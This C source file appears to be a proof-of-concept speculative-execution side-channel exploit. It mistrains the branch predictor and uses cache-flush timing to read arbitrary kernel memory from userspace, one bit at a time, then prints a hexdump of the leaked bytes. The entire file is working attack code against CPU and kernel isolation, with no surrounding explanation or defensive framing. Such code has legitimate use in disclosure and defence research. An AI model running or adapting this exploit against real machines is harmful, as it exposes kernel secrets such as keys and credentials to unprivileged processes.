#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <err.h>
#include <stdbool.h>
#include <ctype.h>

/* memory clobber is not actually true, but serves as a compiler barrier */
#define pipeline_flush() asm volatile("mov $0, %%eax\n\tcpuid" : /*out*/ : /*in*/ : "rax","rbx","rcx","rdx","memory")
#define clflush(addr) asm volatile("clflush (%0)"::"r"(addr):"memory")
#define read_byte(addr) asm volatile("mov (%0), %%r11"::"r"(addr):"r11","memory")
#define rdtscp() ({unsigned int result; asm volatile("rdtscp":"=a"(result)::"rdx","rcx","memory"); result;})

int timed_load(void *ptr) {
  pipeline_flush();
  unsigned int t1 = rdtscp();
  pipeline_flush();
  read_byte(ptr);
  unsigned int t2 = rdtscp();
  pipeline_flush();
  return t2 - t1;
}

/* leak_func_condition is in an otherwise unused page to prevent interference */
unsigned long leak_func_condition_[0x3000];
#define leak_func_condition (leak_func_condition_ + 0x1800)

/* Most code isn't optimized to make the compiler's output more predictable,
 * but this function should probably be optimized.
 */
__attribute__((noclone,noinline,optimize(3))) unsigned char leak_func(uint8_t *timing_leak_array, uint8_t *source_ptr, unsigned int bitmask, unsigned int bitshift) {
  pipeline_flush();
  /* run the branch if the high-latency load returns zero.
   * if the logic was the other way around, Intel's heuristic
   * where high-latency loads speculatively return zero (?)
   * would probably bite.
   */
  if (__builtin_expect(*leak_func_condition == 0, 1)) {
    return timing_leak_array[((*source_ptr)&bitmask)<<bitshift];
  }
  return 0;
}

/* "leak" from here when conditioning the branch predictor */
uint8_t dummy_array[1];

/* timing_leak_array is in an otherwise unused page to prevent interference */
uint8_t timing_leak_array_[10000];
#define timing_leak_array (timing_leak_array_ + 4096)

int freshen_fd;

/* Leak `*(uint8_t*)byte_addr & (1<<bit_idx)` from the kernel.
 * This function makes 16 attempts to leak the data.
 * Before each attempt, data is leaked from the `dummy_array`
 * in userspace 31 times, then discarded, to convince the
 * CPU to go down the wrong path when we try to leak from the
 * kernel.
 */
int leak_bit(unsigned long byte_addr, int bit_idx) {
  uint8_t *secret_arrays[32];
  for (int i=0; i<31; i++) {
    secret_arrays[i] = dummy_array;
  } 
  secret_arrays[31] = (void*)byte_addr;

  unsigned int votes_0 = 0;
  unsigned int votes_1 = 0;
  for (int i=0; i<16*32; i++) {
    //int attempt = (i >> 5) & 0xf;
    int mislead = i & 0x1f;
    uint8_t *cur_secret_array = secret_arrays[mislead];
    char discard;
    pread(freshen_fd, &discard, 1, 0);
    pipeline_flush();
    clflush(timing_leak_array);
    clflush(timing_leak_array + (1<<10));
    *leak_func_condition = (mislead == 31);
    pipeline_flush();
    clflush(leak_func_condition);
    pipeline_flush();
    leak_func(timing_leak_array, cur_secret_array, 1<<bit_idx, 10-bit_idx);
    uint32_t latency_at_b0 = timed_load(timing_leak_array);
    uint32_t latency_at_b1 = timed_load(timing_leak_array + (1<<10));
    if (mislead == 31) {
      //printf("(%d,%d)\t", latency_at_b0, latency_at_b1);
      votes_0 += (latency_at_b0 < latency_at_b1);
      votes_1 += (latency_at_b1 < latency_at_b0);
    }
  }
  //printf("\nvotes_0: %d\nvotes_1: %d\n", votes_0, votes_1);
  return votes_0 < votes_1;
}

uint8_t leak_byte(unsigned long byte_addr) {
  uint8_t res = 0;
  for (int bit_idx = 0; bit_idx < 8; bit_idx++) {
    res |= leak_bit(byte_addr, bit_idx) << bit_idx;
  }
  return res;
}

void hexdump_memory(unsigned long byte_addr_start, unsigned long byte_count) {
  if (byte_count % 16)
    errx(1, "hexdump_memory called with non-full line");
  bool last_was_all_zeroes = false;
  for (unsigned long byte_addr = byte_addr_start; byte_addr < byte_addr_start + byte_count;
          byte_addr += 16) {
    int bytes[16];
    bool all_zeroes = true;
    for (int i=0; i<16; i++) {
      bytes[i] = leak_byte(byte_addr + i);
      if (bytes[i] != 0)
        all_zeroes = false;
    }

    if (all_zeroes) {
      if (!last_was_all_zeroes) {
        puts("[ zeroes ]");
      }
      last_was_all_zeroes = true;
      continue;
    }
    last_was_all_zeroes = false;

    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%016lx  ", byte_addr);
    for (int i=0; i<16; i++) {
      linep += sprintf(linep, "%02hhx ", (unsigned char)bytes[i]);
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      if (isalnum(bytes[i]) || ispunct(bytes[i]) || bytes[i] == ' ') {
        *(linep++) = bytes[i];
      } else {
        *(linep++) = '.';
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }
}

int main(int argc, char **argv) {
  if (argc != 3)
    errx(1, "invocation: %s <kernel_addr> <length>", argv[0]);
  unsigned long start_addr = strtoul(argv[1], NULL, 16);
  unsigned long leak_len = strtoul(argv[2], NULL, 0);

  /* we will read from this fd before every attempt to leak data
   * to make the kernel load the core_pattern (and a couple other
   * data structures) into the CPU's data cache
   */
  freshen_fd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
  if (freshen_fd == -1)
    err(1, "open corepat");

  hexdump_memory(start_addr, leak_len);
}
